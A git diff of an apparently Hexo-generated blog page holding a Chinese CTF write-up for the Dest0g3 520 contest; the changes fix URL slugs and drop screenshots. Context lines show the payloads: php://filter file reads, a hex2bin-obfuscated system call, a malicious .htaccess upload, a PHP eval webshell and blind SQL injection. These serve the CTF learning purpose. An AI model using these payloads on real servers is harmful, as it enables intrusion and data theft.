@@ -19,7 +19,7 @@
   <meta name="description" content="你管这叫迎新赛… 猛新啊，那没事了。 只有自己不会做的世界达成了 Misc的话… 之后再看看">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Dest0g3 520 迎新赛部分write up">
-<meta property="og:url" content="http://example.com/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/index.html">
+<meta property="og:url" content="http://example.com/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/index.html">
 <meta property="og:site_name" content="Err0r233">
 <meta property="og:description" content="你管这叫迎新赛… 猛新啊，那没事了。 只有自己不会做的世界达成了 Misc的话… 之后再看看">
 <meta property="og:locale" content="en_US">
@@ -28,9 +28,9 @@
 <meta property="article:modified_time" content="2022-11-13T10:27:12.718Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="SQL_Injection">
+<meta property="article:tag" content="POST">
 <meta property="article:tag" content="RCE">
 <meta property="article:tag" content="Upload">
-<meta property="article:tag" content="POST">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/failure.ico">
 <meta name="twitter:site" content="@Err0r2333">
@@ -164,7 +164,7 @@
 
             <article itemscope itemtype="https://schema.org/Article">
     
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/">
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
@@ -185,7 +185,7 @@
                     字
                 </li>
                 
-                    <li id="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/" class="leancloud_visitors" data-flag-title="Dest0g3 520 迎新赛部分write up">
+                    <li id="/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/" class="leancloud_visitors" data-flag-title="Dest0g3 520 迎新赛部分write up">
                         <i class="fa fa-eye"></i>
                         <span class="leancloud-visitors-count"> </span> 次阅读
                     </li>
@@ -221,10 +221,10 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>
 
 <p>进行base64解码后就能获得flag</p>
-<img src="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/1.png" class title="获得flag">
+
 
 <p>成功获得flag</p>
-<img src="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/2.png" class title="获得flag">
+
 
 
 
@@ -245,7 +245,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <p>就会报错，执行set_error_hanlder 打印fl4g</p>
-<img src="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/3.png" class title="拿到flag">
+
 
 <h2><span id="simplerce">SimpleRCE</span></h2><p>学到了新姿势…</p>
 <p>Try Try hex2bin</p>
@@ -269,7 +269,7 @@
 <p>也就是构造</p>
 <p><code>aaa=hex2bin(&#39;73797374656d&#39;)(hex2bin(&#39;636174202f666c6167&#39;));</code></p>
 <p>成功获取flag</p>
-<img src="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/4.png" class title="获取flag">
+
 
 <hr>
 <h2><span id="funny_upload">funny_upload</span></h2><p>.htaccess的新姿势</p>
@@ -289,19 +289,19 @@
 <p>所以我们传入的.htaccess文件内容如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt  <span class="comment">//将.txt文件解析为php</span></span><br><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=1.txt&quot;</span></span><br><span class="line"><span class="comment">//直接加载php://filter/convert.base64-decode/resource=1.txt（很熟悉吧，如果成功上传，就会在文件的底部加上1.txt base64解码的东西）</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/5.png" class title="上传.htaccess">
+
 
 
 
 <p>然后传个1.txt</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;  --&gt;base64 encode</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+</span><br></pre></td></tr></table></figure>
 
-<img src="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/6.png" class title="上传木马">
+
 
 <p>蚁剑连接，找到flag</p>
-<img src="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/7.png" class title="蚁剑连接">
 
-<img src="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/8.png" class title="获得flag">
+
+
 
 <hr>
 <h2><span id="really-easy-sql">Really Easy SQL</span></h2><p>延时盲注（过滤sleep()，substr()）</p>
@@ -327,10 +327,10 @@
 
 <p>同样的，睡一觉起来就能拿到flag了</p>
 <p>先去睡会吧~</p>
-<img src="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/9.png" class title="跑脚本">
+
 
 <p>不通顺的地方我也没办法，benchmark真的就是误差太大了，我这边使用3000000次和1.8能跑出flag</p>
-<img src="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/10.png" class title="拿flag">
+
 
 <h2><span id="easysql">EasySQL</span></h2><p>和上一题是一样的，但是过滤了大小于号…</p>
 <p>那么我们就不能够用二分跑了，只能一个个遍历，我靠</p>
@@ -343,7 +343,7 @@
 <span class="blur">这是真的慢啊啊啊啊啊</span>
 
 <p>跑了大概17、8分钟后，终于跑完了</p>
-<img src="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/12.png" class title="真的慢">
+
 
 <hr>
 <p>会看wp然后会做的就这点了，剩下的啥都不会做，寄寄寄</p>
@@ -411,7 +411,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "http://example.com/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/",
+                text: "http://example.com/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -423,7 +423,7 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "http://example.com/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/";
+            const hostUrl       = "http://example.com/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/";
             const title         = "「Dest0g3 520 迎新赛部分write up」";
             const excerpt       = `你管这叫迎新赛…
 猛新啊，那没事了。
@@ -480,7 +480,7 @@ Misc的话… 之后再看看`;
                 appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
                 visitor: true,
                 enableQQ: false,
-                path: '/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/'
+                path: '/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/'
                 
             });
         }
@@ -623,7 +623,7 @@ Misc的话… 之后再看看`;
         
           
           
-            <a class="list-group-item" href="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/"><i class="fa  fa-book"></i> Dest0g3 520 迎新赛部分write up</a>
+            <a class="list-group-item" href="/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/"><i class="fa  fa-book"></i> Dest0g3 520 迎新赛部分write up</a>
             
           
         
